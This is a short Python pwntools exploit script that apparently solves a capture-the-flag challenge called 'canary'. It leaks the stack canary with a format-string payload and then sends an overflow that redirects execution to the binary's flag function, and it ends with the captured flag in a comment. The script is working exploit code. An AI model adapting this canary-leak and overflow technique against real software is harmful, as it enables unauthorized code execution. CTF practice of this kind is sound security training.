from pwn import *


binpath = './canary'
elf = ELF(binpath)


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = 'DEBUG'


# io = process(binpath)
gdbscript = '''
gef
# b greet
# fsb printf
b *0x400919
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('shell.actf.co', 20701)


addr_flag_func = 0x400787

io.recvuntil(b'name? ')

payload = b'%17$p'
io.sendline(payload)

io.recvuntil(b'Nice to meet you, ')
data = io.recvuntil(b'!')[:-1]
canary = int(data, 16)
print("canary: 0x{:x}".format(canary))

io.recvuntil(b'tell me? ')


payload = b''
payload += b'B' * 0x38
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(elf.symbols['flag'])
io.sendline(payload)


io.interactive()


# actf{youre_a_canary_killer_>:(}
